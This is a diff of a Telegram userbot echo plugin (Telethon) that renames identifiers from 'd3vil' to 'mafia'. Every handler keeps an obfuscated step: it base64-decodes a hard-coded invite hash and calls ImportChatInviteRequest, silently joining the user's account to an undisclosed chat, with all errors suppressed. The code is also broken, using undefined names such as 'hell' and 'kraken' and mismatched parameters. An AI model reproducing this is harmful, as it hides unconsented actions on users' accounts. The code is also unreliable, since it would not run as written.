@@ -5,62 +5,62 @@ import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from d3vilbot.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from mafiabot.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 from . import *
 
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(d3vil):
-    if d3vil.fwd_from:
+async def echo(mafia):
+    if mafia.fwd_from:
         return
-    if d3vil.reply_to_msg_id is not None:
-        reply_msg = await d3vil.get_reply_message()
+    if mafia.reply_to_msg_id is not None:
+        reply_msg = await mafia.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = d3vil.chat_id
+        chat_id = mafia.chat_id
         try:
-            d3vilkrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            d3vilkrish = Get(d3vilkrish)
-            await d3vil.client(d3vilkrish)
+            mafiakrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            mafiakrish = Get(mafiakrish)
+            await mafia.client(mafiakrish)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             await eod(hell, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await eor(d3vil, "**Hello 👋**")
+        await eor(mafia, "**Hello 👋**")
     else:
-        await delete_d3vil(d3vil, "Reply to a User's message to echo his messages")
+        await delete_mafia(mafia, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(d3vil):
-    if d3vil.fwd_from:
+async def echo(mafia):
+    if mafia.fwd_from:
         return
-    if d3vil.reply_to_msg_id is not None:
+    if mafia.reply_to_msg_id is not None:
         reply_msg = await hell.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = d3vil.chat_id
+        chat_id = mafia.chat_id
         try:
-            d3vilkrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            d3vilkrish = Get(d3vilkrish)
-            await d3vil.client(d3vilkrish)
+            mafiakrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            mafiakrish = Get(mafiakrish)
+            await mafia.client(mafiakrish)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await eod(d3vil, "Echo has been stopped for the user")
+            await eod(mafia, "Echo has been stopped for the user")
         else:
-            await eod(d3vil, "The user is not activated with echo")
+            await eod(mafia, "The user is not activated with echo")
     else:
-        await eod(d3vil, "Reply to a User's message to echo his messages")
+        await eod(mafia, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(d3vil):
-    if d3vil.fwd_from:
+async def echo(mafia):
+    if mafia.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -82,25 +82,25 @@ async def echo(d3vil):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"Echo enabled users: [here]({url})"
-        await eor(d3vil, reply_text)
+        await eor(mafia, reply_text)
     else:
-        await eor(d3vil, output_str)
+        await eor(mafia, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
 async def samereply(hell):
-    if d3vil.chat_id in Config.BL_CHAT:
+    if mafia.chat_id in Config.BL_CHAT:
         return
-    if is_echo(d3vil.sender_id, d3vil.chat_id):
+    if is_echo(mafia.sender_id, mafia.chat_id):
         await asyncio.sleep(2)
         try:
-            d3vilkrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            d3vilkrish = Get(kraken)
-            await d3vilkrish.client(d3vilkrish)
+            mafiakrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            mafiakrish = Get(kraken)
+            await mafiakrish.client(mafiakrish)
         except BaseException:
             pass
-        if d3vilkrish.message.text or d3vilkrish.message.sticker:
-            await d3vil.reply(hell.message)
+        if mafiakrish.message.text or mafiakrish.message.sticker:
+            await mafia.reply(hell.message)
 
 
 CmdHelp("echo").add_command(
